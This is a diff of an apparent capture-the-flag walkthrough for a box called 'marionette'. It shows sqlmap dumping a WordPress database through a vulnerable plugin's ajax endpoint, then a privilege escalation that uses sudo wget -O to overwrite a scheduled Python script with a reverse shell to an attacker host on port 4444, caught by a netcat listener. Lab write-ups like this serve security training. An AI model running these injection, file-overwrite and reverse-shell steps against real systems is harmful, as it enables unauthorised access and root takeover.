@@ -56,9 +56,9 @@ Examine the exploit for the vulnerable plugin from ExploitDB, this endpoint is v
 wp-admin/admin-ajax.php?action=get_question&question_id=1
 ```
 
-While we can use the exploti PoC; we can directly use sqlmap instead
+> Although we can use the exploitdb's PoC; it's better to run sqlmap directly
 
-Use the exploit to dump the WordPress database:
+Use sqlmap to dump the WordPress database:
 ```bash
 sqlmap 'http://marionette.ip/wp-admin/admin-ajax.php?action=get_question&question_id=1' --dbs
 ```
@@ -73,16 +73,49 @@ Obtain credentials for the user `pinocchio` and use them to gain a shell on the 
 
 
 # Privilege Escalation
-// Todo: add more details
+As always, we start post exploitation enumeration by checking for unusual files, folders, permissions all over the box, we particularly come accross a python program in `/opt/workshop`, `ls -la /opt/workshop` will reveal that the file is being written every 5 minutes, perhaps it could also have been executing* in between the intervals?
 
-Replace the script with this
+Before inspecting the file, let's go back to one of the important enumeration commands
+```bash
+sudo -l
+
+User pinocchio may run the following commands on marionette:
+(bluefairy) NOPASSWD: /usr/bin/wget
+```
+> Interestingly, this makes more sense if you read the note left over by the blue fairy in pinocchio's home
+
+Let us now modify `/opt/workshop/workshop_utils.py` and gain a reverse shell; but unfortunately the file is only writable by bluefairy!
+
+Upon reading the manpage of wget; we get to know that we can overwrite a file using the -O command!
+
+Open up two new tabs in your attack machine, prepare a malicious file `workshop_utils.py` with the following code
+
 
 ```python
 import socket,os,pty
 
 def check_inventory():
     s=socket.socket()
-    s.connect(("192.168.1.139", 4444))
+    s.connect(("10.10.10.8", 4444))
     [os.dup2(s.fileno(),fd) for fd in (0,1,2)]
     pty.spawn("/bin/sh")
 ```
+Replace `10.10.10.8` with your actual attacker's ip address, now save this file, start a listener with `nc -nlvp 4444`
+
+On a second tab, let's serve this file via python:
+```bash
+python3 -m http.server 8000
+```
+
+On your ssh session as pinocchio@marionette; run the following commands to replace the workshop utility AS* the bluefairy
+
+```bash
+cd /opt/workshop
+sudo -u bluefairy wget http://10.10.10.8:8000/workshop_utils.py -O workshop_utils.py
+```
+
+> make sure the file has been successfully overwritten, then wait <2 minutes to receive a reverse connection back, if everything goes well, you'll receive a root shell on your netcat listener tab; 
+
+> If more than 2 minutes have passed and you still haven't received the connection, verify that `workshop_utils.py` has been successfully overwritten. Recall that during enumeration, we observed the file is automatically rolled back to its original state every 5 minutes (a cleanup task performed by the box). 
+
+> Re-run the malicious wget command to overwrite the file again. This time, your exploit should execute within 2 minutes, before the scheduled cleanup task runs.
